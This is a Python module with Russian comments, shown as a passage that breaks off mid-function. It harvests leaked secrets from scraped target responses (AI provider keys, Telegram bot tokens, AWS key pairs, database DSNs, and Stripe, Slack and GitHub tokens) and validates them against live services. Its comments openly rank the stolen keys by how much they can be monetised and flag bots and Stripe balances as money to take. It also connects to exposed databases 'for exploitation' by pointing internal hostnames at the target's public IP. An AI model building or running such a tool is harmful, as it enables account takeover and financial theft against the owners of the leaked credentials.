# -*- coding: utf-8 -*-
"""Верификация найденных секретов: AI-ключи, telegram-боты, AWS, DSN.

Все проверки бесплатны и безопасны (без списания средств, read-only).
"""
import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlsplit

import aiohttp

# Извлечение ключей по уникальным префиксам провайдеров
KEY_EXTRACTORS: list[tuple[str, re.Pattern[str]]] = [
    ("anthropic", re.compile(r'\bsk-ant-api03-[A-Za-z0-9_-]{20,}')),
    ("openrouter", re.compile(r'\bsk-or-v1-[A-Za-z0-9]{40,}')),
    ("openai", re.compile(r'\bsk-(?:proj|svcacct)-[A-Za-z0-9_-]{40,}')),
    ("openai", re.compile(r'\bsk-[A-Za-z0-9]{48,}')),
    ("groq", re.compile(r'\bgsk_[A-Za-z0-9]{40,}')),
    ("gemini", re.compile(r'\bAIza[0-9A-Za-z_-]{35}')),
    ("huggingface", re.compile(r'\bhf_[A-Za-z0-9]{30,}')),
    ("xai", re.compile(r'\bxai-[A-Za-z0-9]{40,}')),
    # deepseek: sk- + ровно 32 hex (у openai 48+ alnum, коллизий нет)
    ("deepseek", re.compile(r'\bsk-[0-9a-f]{32}\b')),
    # fireworks.ai: есть некенсурированные модели (dolphin и др.)
    ("fireworks", re.compile(r'\bfw_[A-Za-z0-9]{20,40}\b')),
    # fish.audio (TTS): ключ вида sk-fish-... с дефисами — generic openai-паттерн
    # его не берёт (там только [A-Za-z0-9])
    ("fish", re.compile(r'\bsk-fish-[A-Za-z0-9_-]{20,}')),
    # Яндекс OAuth-токены: доступ к Директу/Метрике/Паспорту — деньги в кампаниях
    ("yandex_direct", re.compile(r'\by0_[A-Za-z0-9_-]{20,}')),
    # kling: доступ по JWT из пары access_key+secret_key — ловим саму пару (см. extract_ai_keys)
    # seedance: API-ключ Volcengine Ark (модели Seedance/Doubao) — ключ с контекстом
]

# Провайдеры, у которых есть модели без цензуры (dolphin/hermes/llama-uncensored
# и т.п.) — такие ключи ценнее обычных
UNCENSORED_PROVIDERS = {"openrouter", "xai", "together", "fireworks", "deepseek"}

# Бесплатные проверочные эндпоинты (не генерируют токены)
PROVIDER_URLS = {
    "openai": "https://api.openai.com/v1/models",
    "anthropic": "https://api.anthropic.com/v1/models",
    "groq": "https://api.groq.com/openai/v1/models",
    # auth/key - единственный, кто отдаёт реальный баланс (limit/usage)
    "openrouter": "https://openrouter.ai/api/v1/auth/key",
    "huggingface": "https://huggingface.co/api/whoami-v2",
    "xai": "https://api.x.ai/v1/api-key",
    "deepseek": "https://api.deepseek.com/models",
    "fireworks": "https://api.fireworks.ai/inference/v1/models",
    # together.ai: ключ = 64 hex, формат неуникальный — извлекаем по контексту
    "together": "https://api.together.xyz/v1/models",
    # fish.audio (TTS): /wallet/self/api-credit сам проверяет ключ и отдаёт остаток
    "fish": "https://api.fish.audio/wallet/self/api-credit",
    # seedance: ключ Volcengine Ark — модели видео-генерации Seedance/Doubao
    "seedance": "https://ark.cn-beijing.volces.com/api/v3/models",
}


def extract_ai_keys(text: str) -> list[tuple[str, str]]:
    """Извлекает пары (provider, key) из текста ответа."""
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for provider, rx in KEY_EXTRACTORS:
        for m in rx.finditer(text):
            key = m.group(0)
            if key not in seen:
                seen.add(key)
                found.append((provider, key))
    # together.ai: 64-hex ключ, узнаём только по слову together рядом
    for m in re.finditer(r'(?i)together', text):
        window = text[max(0, m.start() - 200): m.start() + 400]
        km = re.search(r'\b([0-9a-f]{64})\b', window)
        if km and km.group(1) not in seen:
            seen.add(km.group(1))
            found.append(("together", km.group(1)))
            break
    # kling: JWT строится из пары access_key+secret_key — ловим пару рядом
    for m in re.finditer(r'(?i)kling', text):
        window = text[max(0, m.start() - 300): m.start() + 500]
        am = re.search(r'"(?:access_?key|ak)"\s*:\s*"([A-Za-z0-9_\-]{8,64})"', window)
        sm = re.search(r'"(?:secret_?key|sk)"\s*:\s*"([A-Za-z0-9_\-]{8,64})"', window)
        if am and sm and am.group(1) not in seen:
            seen.add(am.group(1))
            found.append(("kling", f'{am.group(1)}:{sm.group(1)}'))
            break
    # seedance/volcengine ark: UUID-ключ рядом с ark/seedance/doubao-контекстом
    for m in re.finditer(r'(?i)(?:seedance|volces|ark\.cn-beijing|doubao)', text):
        window = text[max(0, m.start() - 200): m.start() + 400]
        km = re.search(
            r'"(?:ark[-_ ]?api[-_ ]?key|api[_-]?key|apiKey)"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            window, re.I)
        if km and km.group(1) not in seen:
            seen.add(km.group(1))
            found.append(("seedance", km.group(1)))
            break
    return found


def _models_summary(data: Any) -> str:
    """Краткая сводка доступных моделей из ответа /models.

    Понимает openai-совместимый формат ({"data": [{"id": ...}]}) и
    gemini ({"models": [{"name": "models/..."}]}).
    """
    models: Any = []
    if isinstance(data, dict):
        models = data.get("data") or data.get("models") or []
    names: list[str] = []
    for m in models:
        if isinstance(m, dict):
            mid = m.get("id") or m.get("name") or ""
            if mid:
                names.append(str(mid).removeprefix("models/"))
    if not names:
        return ""
    return f"{len(names)} моделей: {', '.join(names)}"


async def _deepseek_balance(
    session: aiohttp.ClientSession, key: str,
    proxy: str | None, timeout_s: float,
) -> str:
    """Баланс на deepseek-ключе (сколько денег доступно)."""
    try:
        async with session.get(
            "https://api.deepseek.com/user/balance",
            headers={"Authorization": f"Bearer {key}"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                parts = [
                    f"баланс {b.get('total_balance')} {b.get('currency')}"
                    for b in (data.get("balance_infos") or [])
                    if b.get("total_balance")
                ]
                return " | ".join(parts)
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    return ""


async def _xai_models(
    session: aiohttp.ClientSession, key: str,
    proxy: str | None, timeout_s: float,
) -> str:
    """Доступные grok-модели (xai верифицируется через /api-key, не /models)."""
    try:
        async with session.get(
            "https://api.x.ai/v1/models",
            headers={"Authorization": f"Bearer {key}"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                return _models_summary(await resp.json(content_type=None))
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    return ""


def _kling_jwt(ak: str, sk: str) -> str:
    """JWT для авторизации kling: HS256, iss=access_key, окно exp/nbf 30 мин."""
    def b64url(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    now = int(time.time())
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"iss": ak, "exp": now + 1800, "nbf": now - 5}, separators=(",", ":")).encode())
    sig = b64url(hmac.new(sk.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
    return f"{header}.{payload}.{sig}"


async def _verify_kling(
    session: aiohttp.ClientSession, key: str,
    proxy: str | None, timeout_s: float,
) -> dict[str, Any]:
    """Проверка kling: GET несуществующей задачи — без списаний.

    Валидная пара ak/sk проходит авторизацию (ответ про отсутствие задачи),
    битая — "access key not found". Задача не создаётся.
    """
    result: dict[str, Any] = {
        "provider": "kling", "key": key, "status": "error", "detail": "", "uncensored": False,
    }
    try:
        ak, sk = key.split(":", 1)
    except ValueError:
        result["detail"] = "bad pair"
        return result
    try:
        url = "https://api.klingai.com/v1/videos/text2video/00000000-0000-0000-0000-000000000000"
        async with session.get(
            url, headers={"Authorization": f"Bearer {_kling_jwt(ak, sk)}"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            body = await resp.text()
            low = body.lower()
            if resp.status == 401 or "access key not found" in low or "signature" in low:
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            elif resp.status < 400:
                result["status"] = "valid"
                result["detail"] = "ключ активен"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


async def _verify_yandex_direct(
    session: aiohttp.ClientSession, key: str,
    proxy: str | None, timeout_s: float,
) -> dict[str, Any]:
    """Проверка Yandex OAuth-токена: паспорт + Директ (кампании/расход).

    read-only: clients и campaigns только на чтение. Токен без доступа к
    Директу всё равно подтверждает личность (паспорт).
    """
    result: dict[str, Any] = {
        "provider": "yandex_direct", "key": key, "status": "error",
        "detail": "", "uncensored": False,
    }
    try:
        async with session.get(
            "https://login.yandex.ru/info?format=json",
            headers={"Authorization": f"OAuth {key}"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as r:
            info = await r.json(content_type=None)
        login = (info or {}).get("login")
        if not login:
            result["status"] = "invalid"
            result["detail"] = "no identity"
            return result
        identity = f"{login} (uid {info.get('id')})"
        # Директ: расход по кампаниям (общий счёт) — деньги
        detail_parts = [f"login {identity}"]
        async with session.post(
            "https://api.direct.yandex.com/json/v5/campaigns",
            data=json.dumps({
                "method": "get",
                "params": {
                    "SelectionCriteria": {},
                    "FieldNames": ["Id", "Name", "Type", "Status", "State", "Funds"],
                    "Page": {"Limit": 500},
                },
            }).encode(),
            headers={"Authorization": f"Bearer {key}",
                     "Content-Type": "application/json; charset=utf-8",
                     "Accept-Language": "ru"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as r:
            j = await r.json(content_type=None)
        camps = ((j or {}).get("result") or {}).get("Campaigns") or []
        if not camps and isinstance(j, dict) and j.get("error"):
            err = (j["error"] or {}).get("error_string", "") or "no direct"
            result["status"] = "valid"
            result["detail"] = f"{identity} — Директ: {err}".strip(" —")
            return result
        spend, rest, cur = 0, 0, "RUB"
        for c in camps:
            f = c.get("Funds") or {}
            saf = f.get("SharedAccountFunds") or {}
            spend += saf.get("Spend", 0) or 0
            rest += (f.get("Rest", 0) or 0) + (saf.get("Balance", 0) or 0)
            if c.get("Currency"):
                cur = c["Currency"]
        # общая сумма видна только в аккаунте-корпорации; по кампаниям — Rest
        tail = f"кампаний {len(camps)}"
        if spend:
            tail += f", расход {spend / 1e6:,.0f} {cur}".replace(",", " ")
        if rest:
            tail += f", остаток {rest / 1e6:,.0f} {cur}".replace(",", " ")
        result["status"] = "valid"
        # identity в начале — нужен для извлечения прибыли (какой аккаунт)
        result["detail"] = f"{identity} — {tail}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


async def verify_ai_key(
    session: aiohttp.ClientSession,
    provider: str,
    key: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет ключ: valid / invalid / error + детали.

    Детали: доступные модели (в ответе верификации, без доп. запросов),
    баланс deepseek, limit/usage openrouter, кредит fish.audio.
    """
    if provider == "kling":
        return await _verify_kling(session, key, proxy, timeout_s)
    if provider == "yandex_direct":
        return await _verify_yandex_direct(session, key, proxy, timeout_s)
    result: dict[str, Any] = {
        "provider": provider,
        "key": key,
        "status": "error",
        "detail": "",
        "uncensored": provider in UNCENSORED_PROVIDERS,
    }
    try:
        if provider == "gemini":
            url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
            headers = {}
        else:
            url = PROVIDER_URLS[provider]
            if provider == "anthropic":
                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
            else:
                headers = {"Authorization": f"Bearer {key}"}

        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.get(
            url, headers=headers, proxy=proxy, timeout=timeout
        ) as resp:
            if resp.status in (200, 201):
                result["status"] = "valid"
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    data = None
                if provider == "openrouter":
                    try:
                        od = (data or {}).get("data", {})
                        limit = od.get("limit")
                        if limit is None:
                            result["detail"] = (
                                f"free_tier={od.get('is_free_tier')} "
                                f"spent={od.get('usage')}"
                            )
                        else:
                            result["detail"] = (
                                f"limit={limit} spent={od.get('usage')} "
                                f"free_tier={od.get('is_free_tier')}"
                            )
                    except Exception:
                        pass
                elif provider == "fish":
                    # /wallet/self/api-credit: credit = остаток денег на TTS
                    credit = (data or {}).get("credit")
                    free = (data or {}).get("has_free_credit")
                    if credit is not None:
                        result["detail"] = f"кредит {credit}"
                        if free:
                            result["detail"] += " (есть free-кредит)"
                else:
                    # доступные модели из того же ответа (без доп. запросов)
                    result["detail"] = _models_summary(data)
            elif resp.status in (401, 403) or (resp.status == 400 and provider == "gemini"):
                # Gemini отдаёт 400 для невалидных API-ключей
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"

        # Доп. read-only запросы только для валидных ключей
        if result["status"] == "valid":
            extra = ""
            if provider == "deepseek":
                extra = await _deepseek_balance(session, key, proxy, timeout_s)
            elif provider == "xai":
                extra = await _xai_models(session, key, proxy, timeout_s)
            if extra:
                result["detail"] = f"{result['detail']} | {extra}".strip(" |")
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# Telegram bot tokens: id:hash
# (?<!\d): id не может быть хвостом более длинного числа
# (напр. ig_version "1781452849827659916:69b77f04..." — не токен);
# (?![A-Za-z0-9_-]): секрет ровно 35 символов (не префикс hex-блоба)
TELEGRAM_BOT_RE = re.compile(r'(?<!\d)(\d{8,10}):([A-Za-z0-9_-]{35})(?![A-Za-z0-9_-])')


def extract_telegram_bots(text: str) -> list[str]:
    """Извлекает токены telegram-ботов из текста ответа."""
    return list(dict.fromkeys(m.group(0) for m in TELEGRAM_BOT_RE.finditer(text)))


# Платёжные команды telegram-бота (EN/RU)
MONEY_COMMAND_RE = re.compile(
    r'(?:pay|payout|withdraw|cash|balance|topup|top_up|deposit|stars|invoice|buy|replenish'
    r'|вывод|баланс|оплата|пополн|выплат|заработ|кошел)',
    re.I,
)


async def verify_telegram_bot(
    session: aiohttp.ClientSession,
    token: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет бота через getMe (бесплатно и безопасно).

    Дополнительно через getMyCommands ищет платёжные команды
    (вывод/баланс/оплата) - признак бот-кассы, с которой можно брать деньги.
    """
    result: dict[str, Any] = {
        "token": token,
        "status": "error",
        "username": "",
        "money": False,
        "money_commands": [],
    }
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    try:
        async with session.get(
            f"https://api.telegram.org/bot{token}/getMe",
            proxy=proxy,
            timeout=timeout,
        ) as resp:
            if resp.status == 200:
                try:
                    data = await resp.json()
                except Exception:
                    data = {}
                if data.get("ok"):
                    result["status"] = "valid"
                    result["username"] = data.get("result", {}).get("username", "")
                else:
                    result["status"] = "invalid"
            elif resp.status in (401, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"

        # Живой бот: ищем платёжные команды и описания
        if result["status"] == "valid":
            try:
                money_cmds: list[str] = []
                money_desc: list[str] = []
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMyCommands",
                    proxy=proxy,
                    timeout=timeout,
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        cmds = data.get("result") or []
                        money_cmds = [
                            c.get("command", "")
                            for c in cmds
                            if MONEY_COMMAND_RE.search(str(c.get("command", "")))
                            or MONEY_COMMAND_RE.search(str(c.get("description", "")))
                        ]
                # Описания бота часто прямо говорят о деньгах (вывод/баланс)
                for meth, field in (
                    ("getMyDescription", "description"),
                    ("getMyShortDescription", "short_description"),
                ):
                    async with session.get(
                        f"https://api.telegram.org/bot{token}/{meth}",
                        proxy=proxy,
                        timeout=timeout,
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            text = str((data.get("result") or {}).get(field) or "")
                            if text and MONEY_COMMAND_RE.search(text):
                                money_desc.append(text[:100])
                result["money_commands"] = money_cmds
                result["money_text"] = money_desc
                result["money"] = bool(money_cmds or money_desc)
            except (aiohttp.ClientError, TimeoutError):
                pass
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# AWS access key IDs: AKIA = long-term, ASIA = временные STS-креды
AWS_KEY_RE = re.compile(r'\b(A(?:K|S)IA[0-9A-Z]{16})\b')
# bare secret: ровно 40-char base64, не внутри более длинной строки
AWS_BARE_SECRET_RE = re.compile(
    r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])'
)
AWS_SESSION_TOKEN_RE = re.compile(
    r'[\'"]?(?:aws_)?(?:session|security)_token[\'"]?\s*[:=]\s*[\'"]?([A-Za-z0-9/+=]{20,})', re.I
)


def extract_aws_keys(text: str) -> list[str]:
    """Извлекает AWS access key IDs из текста ответа."""
    return list(dict.fromkeys(AWS_KEY_RE.findall(text)))


# Пары access_key + secret_key (JSON-поля, env-пары KEY=v, ini .aws/credentials key = v)
AWS_KEYPAIR_RE = re.compile(
    r'[\'"]?(?:aws_access_key_id|access_key_id|aws_access_key)[\'"]?\s*[:=]\s*[\'"]?'
    r'(A(?:K|S)IA[0-9A-Z]{16})(?![A-Za-z0-9/+=])[\'"]?'
    r'[^{}]{0,400}?'
    r'[\'"]?(?:aws_secret_access_key|secret_access_key|aws_secret_key|secret_key|aws_secret)[\'"]?'
    r'\s*[:=]\s*[\'"]?([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])[\'"]?',
    re.I,
)
AWS_KEYPAIR_RE_R = re.compile(
    r'[\'"]?(?:aws_secret_access_key|secret_access_key|aws_secret_key|secret_key|aws_secret)[\'"]?'
    r'\s*[:=]\s*[\'"]?([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])[\'"]?'
    r'[^{}]{0,400}?'
    r'[\'"]?(?:aws_access_key_id|access_key_id|aws_access_key)[\'"]?'
    r'\s*[:=]\s*[\'"]?(A(?:K|S)IA[0-9A-Z]{16})(?![A-Za-z0-9/+=])[\'"]?',
    re.I,
)


def extract_aws_keypairs(text: str) -> list[tuple[str, str, str]]:
    """Пары (access_key, secret_key, session_token) из одного тела.

    JSON-пары (оба порядка полей), env-пары KEY=v и ini (aws_access_key_id = ...).
    Затем fallback: bare access key
    без пары - кандидат в секрет ищем рядом (окно ±160 символов, ровно
    40-char base64). Ложные кандидаты безопасны: STS вернёт invalid.
    """
    seen: dict[tuple[str, str], str] = {}
    sess_tokens = AWS_SESSION_TOKEN_RE.findall(text)
    token = sess_tokens[0] if sess_tokens else ""

    for m in AWS_KEYPAIR_RE.finditer(text):
        seen.setdefault((m.group(1), m.group(2)), token)
    for m in AWS_KEYPAIR_RE_R.finditer(text):
        seen.setdefault((m.group(2), m.group(1)), token)

    # bare-ключи, не покрытые JSON-парой
    for ak in dict.fromkeys(AWS_KEY_RE.findall(text)):
        if any(k == ak for k, _ in seen):
            continue
        for m in re.finditer(r'\b' + ak + r'\b', text[:100_000]):
            seg = text[max(0, m.start() - 160): m.end() + 160]
            cand = AWS_BARE_SECRET_RE.search(seg)
            if cand and cand.group(0) != ak:
                seen.setdefault((ak, cand.group(0)), token)
                break
    return [(ak, sk, tok) for (ak, sk), tok in seen.items()]


def _sigv4_auth(
    access_key: str, secret_key: str, amzdate: str, datestamp: str,
    body: str, session_token: str = "",
) -> str:
    """Authorization-заголовок SigV4 для POST sts.amazonaws.com (query protocol)."""
    import hashlib
    import hmac as hmac_mod

    def h(key: bytes, msg: str) -> bytes:
        return hmac_mod.new(key, msg.encode(), hashlib.sha256).digest()

    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical_headers = (
        'content-type:application/x-www-form-urlencoded\n'
        'host:sts.amazonaws.com\n'
        f'x-amz-date:{amzdate}\n'
    )
    signed_headers = 'content-type;host;x-amz-date'
    if session_token:
        canonical_headers += f'x-amz-security-token:{session_token}\n'
        signed_headers = 'content-type;host;x-amz-date;x-amz-security-token'
    canonical_request = (
        f'POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}'
    )
    scope = f'{datestamp}/us-east-1/sts/aws4_request'
    string_to_sign = (
        'AWS4-HMAC-SHA256\n'
        f'{amzdate}\n{scope}\n'
        + hashlib.sha256(canonical_request.encode()).hexdigest()
    )
    k = h(('AWS4' + secret_key).encode(), datestamp)
    k = h(k, 'us-east-1')
    k = h(k, 'sts')
    k = h(k, 'aws4_request')
    signature = hmac_mod.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
    return (
        f'AWS4-HMAC-SHA256 Credential={access_key}/{scope}, '
        f'SignedHeaders={signed_headers}, Signature={signature}'
    )


async def verify_aws_keypair(
    session: aiohttp.ClientSession,
    access_key: str,
    secret_key: str,
    session_token: str = "",
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет пару AWS-ключей через STS GetCallerIdentity (SigV4).

    Бесплатно и безопасно: только читает identity (account ID, ARN).
    session_token обязателен для ASIA-ключей (временные STS-креды).
    """
    result: dict[str, Any] = {
        "access_key": access_key, "status": "error",
        "account": "", "arn": "", "detail": "",
    }
    try:
        from datetime import datetime, timezone
        now = datetime.now(timezone.utc)
        amzdate = now.strftime('%Y%m%dT%H%M%SZ')
        datestamp = now.strftime('%Y%m%d')
        body = 'Action=GetCallerIdentity&Version=2011-06-15'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Amz-Date': amzdate,
            'Authorization': _sigv4_auth(
                access_key, secret_key, amzdate, datestamp, body,
                session_token=session_token,
            ),
        }
        if session_token:
            headers['X-Amz-Security-Token'] = session_token
        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.post(
            'https://sts.amazonaws.com/', data=body, headers=headers,
            proxy=proxy, timeout=timeout,
        ) as resp:
            if resp.status == 200:
                text = await resp.text()
                m = re.search(r'<Account>(\d+)</Account>', text)
                arn = re.search(r'<Arn>([^<]+)</Arn>', text)
                if m:
                    result["status"] = "valid"
                    result["account"] = m.group(1)
                    result["arn"] = arn.group(1) if arn else ""
                else:
                    result["detail"] = "no account in response"
            elif resp.status in (400, 401, 403, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# DSN с кредами: postgres/mysql/mongodb/redis/amqp
DSN_RE = re.compile(
    r'\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]+@[^\s"\'<>]+',
    re.I,
)

DSN_DEFAULT_PORTS = {
    "postgresql": 5432, "postgres": 5432,
    "mysql": 3306, "mariadb": 3306,
    "mongodb": 27017, "mongodb+srv": 27017,
    "redis": 6379, "amqp": 5672,
}


def extract_dsns(text: str) -> list[str]:
    """Извлекает DSN с user:pass@ из текста ответа."""
    return list(dict.fromkeys(DSN_RE.findall(text)))


def _effective_dsn_host(host: str, target_host: str | None) -> tuple[str, bool]:
    """Хост для подключения: внутренние (localhost/docker) подменяем на IP цели.

    DSN вида postgres://user:pass@db:5432 виден изнутри контейнера цели -
    снаружи этот же сервис обычно доступен на публичном IP самого хоста.
    """
    h = (host or "").strip().lower()
    if not h:
        return h, False
    internal = (
        h in ("localhost", "::1", "host.docker.internal")
        or h.startswith("127.")
        or "." not in h  # docker service name: db, postgres, redis...
    )
    if not internal:
        try:
            import ipaddress
            ip = ipaddress.ip_address(h)
            internal = ip.is_private or ip.is_loopback or ip.is_link_local
        except ValueError:
            internal = False
    if internal and target_host:
        return target_host, True
    return host, False


async def check_dsn(
    dsn: str, timeout_s: float = 5.0, target_host: str | None = None,
) -> dict[str, Any]:
    """Проверяет DSN: доступен ли хост, работают ли креды (postgres).

    Внутренние хосты (localhost/docker) переподключаются на публичный IP
    цели target_host - там обычно выставлен тот же сервис.
    TCP-коннект идёт напрямую (asyncpg не умеет прокси) - это нормально:
    к найденной БД всё равно придётся подключаться для эксплуатации.
    """
    result: dict[str, Any] = {
        "dsn": dsn, "status": "unreachable", "error": "",
        "connect_host": "", "via": "",
    }
    try:
        u = urlsplit(dsn)
        host = u.hostname or ""
        connect_host, rewritten = _effective_dsn_host(host, target_host)
        result["connect_host"] = connect_host
        result["via"] = target_host if rewritten else ""
        port = u.port or DSN_DEFAULT_PORTS.get(u.scheme.lower(), 0)
        if not connect_host or not port:
            result["error"] = "bad dsn"
            return result

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(connect_host, port), timeout=timeout_s
            )
            writer.close()
            await writer.wait_closed()
        except (OSError, asyncio.TimeoutError) as exc:
            result["error"] = type(exc).__name__
            return result

        # Полная проверка кредов - только postgres (asyncpg уже в зависимостях)
        if u.scheme.lower() in ("postgres", "postgresql") and u.username and u.password:
            # Пересобираем DSN с эффективным хостом (без query)
            auth = u.username
            if u.password is not None:
                auth += ":" + u.password
            new_netloc = f"{auth}@{connect_host}" + (f":{u.port}" if u.port else "")
            clean_dsn = urlunsplit((u.scheme, new_netloc, u.path or "/", "", ""))
            for ssl_arg in (None, False):
                try:
                    import asyncpg
                    conn = await asyncio.wait_for(
                        asyncpg.connect(dsn=clean_dsn, timeout=timeout_s, ssl=ssl_arg),
                        timeout=timeout_s + 2,
                    )
                    await conn.close()
                    result["status"] = "auth_ok"
                    return result
                except Exception as exc:
                    result["error"] = type(exc).__name__
            result["status"] = "reachable"
        else:
            result["status"] = "reachable"
    except Exception as exc:
        result["error"] = type(exc).__name__
    return result


# --- Универсальная верификация сервисных секретов (read-only) ---

SECRET_EXTRACTORS: list[tuple[str, re.Pattern[str]]] = [
    ("stripe", re.compile(r'\b(?:sk|rk)_live_[0-9a-zA-Z]{24,}\b')),
    ("slack", re.compile(r'\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}\b')),
    ("discord", re.compile(r'\b[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{25,}\b')),
    ("github", re.compile(r'\bgh[pousr]_[A-Za-z0-9]{36,}\b')),
    ("gitlab", re.compile(r'\bglpat-[A-Za-z0-9\-]{20,}\b')),
    ("mailgun", re.compile(r'\bkey-[0-9a-f]{32}\b')),
    ("sendgrid", re.compile(r'\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b')),
    ("npm", re.compile(r'\bnpm_[A-Za-z0-9]{36}\b')),
    ("dropbox", re.compile(r'\bsl\.[A-Za-z0-9_-]{130,}\b')),
]


def extract_secrets(text: str) -> list[tuple[str, str]]:
    """Извлекает сервисные секреты (stripe/slack/discord/github/...)."""
    out: list[tuple[str, str]] = []
    for kind, rx in SECRET_EXTRACTORS:
        for v in rx.findall(text):
            out.append((kind, v))
    return list(dict.fromkeys(out))


async def verify_secret(
    session: aiohttp.ClientSession,
    kind: str,
    value: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет сервисный секрет read-only запросом к провайдеру.

    stripe: /v1/balance отдаёт реальный баланс (деньги!), slack: auth.test,
    discord/githab/gitlab/mailgun/sendgrid/npm/dropbox: whoami-эндпоинты.
    """
    result: dict[str, Any] = {
        "kind": kind, "value": value, "status": "error", "detail": "",
    }
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    try:
        if kind == "stripe":
            async with session.get(
                "https://api.stripe.com/v1/balance",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    def _fmt(entries):
                        return [
                            f"{(b or {}).get('amount', 0) / 100:.2f} {(b or {}).get('currency', '')}"
                            for b in (entries or [])
                        ]
                    avail = ", ".join(_fmt(data.get("available")) or ["0"])
                    pend = ", ".join(_fmt(data.get("pending")))
                    result["status"] = "valid"
                    result["detail"] = "balance: " + avail
                    if pend:
                        # pending — деньги, которые упадут на баланс: тоже профит
                        result["detail"] += f" (pending {pend})"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                elif resp.status == 403:
                    # ключ жив, но нет права на чтение баланса (restricted)
                    result["status"] = "valid"
                    result["detail"] = "no balance permission"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "slack":
            # slack возвращает HTTP 200 c ok:false для битого токена
            async with session.get(
                "https://slack.com/api/auth.test",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        result["status"] = "valid"
                        result["detail"] = f"user={data.get('user', '?')} team={data.get('team', '?')}"
                    else:
                        result["status"] = "invalid"
                        result["detail"] = str(data.get("error", ""))
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "discord":
            async with session.get(
                "https://discord.com/api/v10/users/@me",
                headers={"Authorization": f"Bot {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = f"@{data.get('username', '?')}"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind in ("github", "gitlab"):
            url = (
                "https://api.github.com/user"
                if kind == "github"
                else "https://gitlab.com/api/v4/user"
            )
            headers = {
                "Authorization": f"Bearer {value}",
                "Accept": "application/vnd.github+json" if kind == "github" else "application/json",
            }
            async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("login") or data.get("username") or "?")
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
